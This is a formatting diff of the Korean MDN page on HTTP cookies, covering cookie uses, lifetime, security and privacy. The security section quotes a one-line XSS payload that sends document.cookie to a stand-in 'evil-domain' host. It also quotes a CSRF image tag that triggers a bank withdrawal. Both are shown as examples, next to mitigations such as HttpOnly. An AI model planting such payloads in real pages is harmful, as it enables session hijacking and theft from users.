@@ -1,11 +1,11 @@
 ---
 title: HTTP 쿠키
 slug: Web/HTTP/Cookies
-translation_of: Web/HTTP/Cookies
 ---
+
 {{HTTPSidebar}}
 
-HTTP 쿠키(웹 쿠키, 브라우저 쿠키)는 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각입니다. 브라우저는 그 데이터 조각들을 저장해 놓았다가, 동일한 서버에 재 요청 시 저장된 데이터를 함께 전송합니다. 쿠키는 두 요청이 동일한 브라우저에서 들어왔는지 아닌지를 판단할 때 주로 사용합니다. 이를 이용하면 사용자의 로그인 상태를 유지할 수 있습니다. 상태가 없는([stateless](/ko/docs/Web/HTTP/Overview#HTTP_is_stateless_but_not_sessionless)) HTTP 프로토콜에서 상태 정보를 기억시켜주기 때문입니다.
+HTTP 쿠키(웹 쿠키, 브라우저 쿠키)는 서버가 사용자의 웹 브라우저에 전송하는 작은 데이터 조각입니다. 브라우저는 그 데이터 조각들을 저장해 놓았다가, 동일한 서버에 재 요청 시 저장된 데이터를 함께 전송합니다. 쿠키는 두 요청이 동일한 브라우저에서 들어왔는지 아닌지를 판단할 때 주로 사용합니다. 이를 이용하면 사용자의 로그인 상태를 유지할 수 있습니다. 상태가 없는([stateless](/ko/docs/Web/HTTP/Overview#http_is_stateless_but_not_sessionless)) HTTP 프로토콜에서 상태 정보를 기억시켜주기 때문입니다.
 
 쿠키는 주로 세 가지 목적을 위해 사용됩니다:
 
@@ -16,7 +16,7 @@ HTTP 쿠키(웹 쿠키, 브라우저 쿠키)는 서버가 사용자의 웹 브�
 - 트래킹(Tracking)
   - : 사용자 행동을 기록하고 분석하는 용도
 
-과거엔 클라이언트 측에 정보를 저장할 때 쿠키를 주로 사용하곤 했습니다. 쿠키를 사용하는 게 데이터를 클라이언트 측에 저장할 수 있는 유일한 방법이었을 때는 이 방법이 타당했지만, 지금은modern storage APIs를 사용해 정보를 저장하는 걸 권장합니다. 모든 요청마다 쿠키가 함께 전송되기 때문에, (특히 mobile data connections에서) 성능이 떨어지는 원인이 될 수 있습니다. 정보를 클라이언트 측에 저장하려면 Modern APIs의 종류인 [웹 스토리지 API](/ko/docs/Web/API/Web_Storage_API "DOM Storage") (`localStorage`와 `sessionStorage`) 와[ IndexedDB](/ko/docs/Web/API/IndexedDB_API)를 사용하면 됩니다.
+과거엔 클라이언트 측에 정보를 저장할 때 쿠키를 주로 사용하곤 했습니다. 쿠키를 사용하는 게 데이터를 클라이언트 측에 저장할 수 있는 유일한 방법이었을 때는 이 방법이 타당했지만, 지금은modern storage APIs를 사용해 정보를 저장하는 걸 권장합니다. 모든 요청마다 쿠키가 함께 전송되기 때문에, (특히 mobile data connections에서) 성능이 떨어지는 원인이 될 수 있습니다. 정보를 클라이언트 측에 저장하려면 Modern APIs의 종류인 [웹 스토리지 API](/ko/docs/Web/API/Web_Storage_API) (`localStorage`와 `sessionStorage`) 와 [IndexedDB](/ko/docs/Web/API/IndexedDB_API) 를 사용하면 됩니다.
 
 > **참고:** 저장된 쿠키(그리고 웹 페이지가 사용할 수 있는 다른 스토리지)를 보려면, 개발자 도구에서 [Storage Inspector(스토리지 검사기)](/ko/docs/Tools/Storage_Inspector)를 활성화하고 스토리지 트리에서 쿠키 스토리지를 선택하면 됩니다.
 
@@ -57,8 +57,6 @@ Cookie: yummy_cookie=choco; tasty_cookie=strawberry
 > - [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
 > - [Python](https://docs.python.org/3/library/http.cookies.html)
 > - [Ruby on Rails](http://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)
->
-> <!---->
 
 ### 쿠키의 라이프타임
 
@@ -127,7 +125,8 @@ console.log(document.cookie);
 쿠키는 대개 웹 애플리케이션에서 사용자와 그들의 인증된 세션을 식별하기 위해 사용되곤 합니다. 그래서 쿠키를 가로채는 것은 인증된 사용자의 세션 하이재킹으로 이어질 수 있습니다. 쿠키를 가로채는 일반적인 방법은 소셜 공학 사용 혹은 애플리케이션 내 {{Glossary("XSS")}} 취약점을 이용하는 것을 포함합니다.
 
 ```js
-(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
+new Image().src =
+  "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
 ```
 
 `HttpOnly` 쿠키 속성은 자바스크립트를 통해 쿠키 값에 접근하는 것을 막아 이런 공격을 누그러뜨리는데 도움을 줄 수 있습니다.
@@ -137,7 +136,8 @@ console.log(document.cookie);
 [위키피디아](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)에 {{Glossary("CSRF")}}에 대한 좋은 예제가 있습니다. 위키피디아의 예와 같은 상황에서, 당신의 은행 서버에 돈을 입금하는 실제 요청 대신에, 실제로는 이미지가 아닌 이미지를 포함시키고 있습니다(예를 들어 필터링되지 않은 채팅이나 포럼 페이지 내에):
 
 ```html
-<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
+<img
+  src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory" />
 ```
 
 이제, 당신이 당신의 은행 계좌에 로그인하고 당신의 쿠키가 여전히 유효하다면(그리고 별 다른 검증 절차가 존재하지 않는다면), 해당 이미지를 포함하고 있는 HTML을 로드하자마자 돈이 송금될 것입니다. 이런 일들이 벌어지는 것을 방지하기 위한 몇 가지 기술이 있습니다:
@@ -169,7 +169,7 @@ EU 전역의 쿠키에 대한 요구사항은 유럽 의회의 [Directive 2009/1
 
 ### 좀비 쿠키와 Evercookies
 
-쿠키에 대한 좀 더 급진적인 해결책은 삭제 이후에 다시 생성되는 좀비 쿠키 혹은 "Evercookies"이며 의도적으로 영원히 제거하는 것이 어려운 쿠키입니다. 그들은 쿠키가 존재 여부와 관계없이 그들 자신을 다시 만들어내기 위해 [웹 스토리지 API](/ko/docs/Web/API/Web_Storage_API "DOM Storage"), Flash 로컬 공유 객체 그리고 다른 기술들을 사용하고 있습니다.
+쿠키에 대한 좀 더 급진적인 해결책은 삭제 이후에 다시 생성되는 좀비 쿠키 혹은 "Evercookies"이며 의도적으로 영원히 제거하는 것이 어려운 쿠키입니다. 그들은 쿠키가 존재 여부와 관계없이 그들 자신을 다시 만들어내기 위해 [웹 스토리지 API](/ko/docs/Web/API/Web_Storage_API), Flash 로컬 공유 객체 그리고 다른 기술들을 사용하고 있습니다.
 
 - [Samy Kamkar의 Evercookie](https://github.com/samyk/evercookie)
 - [좀비 쿠키에 대한 위키피디아](https://en.wikipedia.org/wiki/Zombie_cookie)
